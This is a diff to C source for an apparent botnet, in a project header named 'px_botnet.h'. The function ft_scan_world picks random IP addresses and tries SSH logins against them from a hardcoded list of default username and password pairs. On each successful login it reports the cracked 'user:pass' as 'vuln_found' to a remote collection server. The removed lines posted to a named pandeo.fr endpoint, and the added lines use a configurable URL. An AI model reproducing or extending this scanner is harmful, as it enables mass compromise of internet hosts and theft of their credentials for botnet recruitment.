@@ -1,22 +1,20 @@
 #include "../includes/px_botnet.h"
 
-void ft_scan_world(pthread_t thread)
+int		user_len = 17;
+char	*user[] = {"root", "admin", "daemon", "User", "root", "default", "root", "admin", "root", "admin", "guest", "administrator", "user", "root", "support", "root", "admin"};
+char	*pass[] = {"root", "admin", "daemon", "admin", "pass", "default", "user", "password", "password", "1234", "guest", "1234", "user", "admin", "support", "default", "123456"};
+
+void ft_scan_world(pthread_t thread) //verif si work tjr
 {
-	CURL *curl;
-	CURLcode res;
 	char ip[18];
 	char *tmp;
+	char *tmp_return;
 	ssh_session ssh;
-	char **user;
-	char **pass;
 	int x;
 	int timeout;
 	int rc;
 	int error;
 
-	user = ft_split(user_to_parse, ' ');
-	pass = ft_split(pass_to_parse, ' ');
-	curl = curl_easy_init();
 	timeout = 10;
 	srand(time(0));
 	while (true)
@@ -48,12 +46,11 @@ void ft_scan_world(pthread_t thread)
 					tmp = ft_strnjoin(tmp, user[x], strlen(user[x]));
 					tmp = ft_strnjoin(tmp, ":", 1);
 					tmp = ft_strnjoin(tmp, pass[x], strlen(pass[x]));
-					tmp = ft_strnjoinf("vuln_found=", tmp, strlen(tmp));
-					curl_easy_setopt(curl, CURLOPT_URL, "https://gdjgufsdhugfsadyuihfyuisdghf.pandeo.fr/api.php");
-					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
-					curl_easy_perform(curl);
-					curl_easy_cleanup(curl);
+					tmp = ft_strnjoinf("?vuln_found=", tmp, strlen(tmp));
+					tmp = ft_strnjoinf(url_page, tmp, strlen(tmp));
+					tmp_return = ft_request(tmp);
 					error = 2;
+					free(tmp_return);
 					free(tmp);
 				}
 			}
